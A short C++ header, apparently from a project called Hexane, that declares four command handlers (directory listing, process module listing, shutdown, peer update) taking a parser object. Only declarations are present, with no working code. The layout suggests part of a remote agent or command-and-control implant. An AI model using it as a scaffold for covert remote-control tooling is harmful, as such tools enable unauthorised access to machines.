#ifndef _HEXANE_COMMANDS_HPP
#define _HEXANE_COMMANDS_HPP
#include <core/include/monolith.hpp>
#include <core/include/cruntime.hpp>
#include <core/include/commands.hpp>
#include <core/include/process.hpp>
#include <core/include/message.hpp>
#include <core/include/stream.hpp>
#include <core/include/hash.hpp>

namespace Commands {
	FUNCTION VOID DirectoryList (PPARSER Parser);
	FUNCTION VOID ProcessModules (PPARSER Parser);
    FUNCTION VOID Shutdown(PPARSER Parser);
	FUNCTION VOID UpdatePeer(PPARSER Parser);
}
#endif //_HEXANE_COMMANDS_HPP